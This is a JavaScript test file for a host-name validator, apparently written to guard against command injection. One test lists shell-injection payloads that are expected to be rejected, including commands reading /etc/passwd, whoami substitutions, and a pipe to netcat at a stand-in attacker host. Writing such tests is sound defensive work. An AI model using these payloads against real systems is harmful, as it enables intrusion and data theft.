const test = require('node:test');
const assert = require('node:assert/strict');

const { isValidHost } = require('../src/lib/host');

test('accepts bare IPv4 addresses', () => {
  assert.equal(isValidHost('8.8.8.8'), true);
  assert.equal(isValidHost('127.0.0.1'), true);
});

test('accepts simple DNS hostnames', () => {
  assert.equal(isValidHost('example.com'), true);
  assert.equal(isValidHost('my-host.internal.example.com'), true);
});

test('rejects shell metacharacters', () => {
  const payloads = [
    '8.8.8.8; cat /etc/passwd',
    '8.8.8.8 && whoami',
    '8.8.8.8 | nc attacker.example.com 4444',
    '$(whoami)',
    '`whoami`',
    '8.8.8.8\ncat /etc/passwd',
    '8.8.8.8 > /tmp/out',
    "8.8.8.8'",
  ];

  for (const payload of payloads) {
    assert.equal(isValidHost(payload), false, `should reject: ${payload}`);
  }
});

test('rejects non-string and empty input', () => {
  assert.equal(isValidHost(undefined), false);
  assert.equal(isValidHost(null), false);
  assert.equal(isValidHost(''), false);
  assert.equal(isValidHost(1234), false);
  // Express gives an array when a query param is repeated.
  assert.equal(isValidHost(['8.8.8.8', 'evil.example.com']), false);
});

test('rejects hosts longer than 253 characters', () => {
  assert.equal(isValidHost('a'.repeat(253)), true);
  assert.equal(isValidHost('a'.repeat(254)), false);
});
